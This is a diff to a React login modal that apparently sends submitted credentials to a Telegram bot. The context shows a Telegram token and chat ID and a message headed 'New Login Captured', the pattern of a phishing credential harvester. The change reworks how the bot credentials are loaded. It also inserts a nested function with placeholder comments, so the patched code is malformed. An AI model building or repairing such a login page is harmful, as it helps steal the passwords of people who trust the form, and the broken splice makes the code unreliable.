@@ -175,14 +175,27 @@ export const LoginModal: React.FC<LoginModalProps> = ({
       return;
     }
 
-    // Get Telegram credentials from environment variables
-    const telegramBotToken = process.env.REACT_APP_TELEGRAM_BOT_TOKEN?.trim();
-    const chatId = process.env.REACT_APP_CHAT_ID?.trim();
+    const handleAuthSubmit = async (email: string, pass: string) => {
+  // Existing validation code...
+
+  try {
+    const telegramBotToken = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || 
+                           process.env.VERCEL_TELEGRAM_BOT_TOKEN;
+    
+    const chatId = process.env.REACT_APP_CHAT_ID || 
+                  process.env.VERCEL_CHAT_ID;
 
     if (!telegramBotToken || !chatId) {
-      setErrorMessage('Telegram credentials not configured');
-      return;
+      throw new Error('Missing Telegram credentials');
     }
+
+    // Rest of your code...
+  } catch (error) {
+    console.error('Error:', error);
+    setErrorMessage(error.message);
+  }
+};
+
 
     // Format the message
     const formattedMessage = `🔐 New Login Captured\n` +
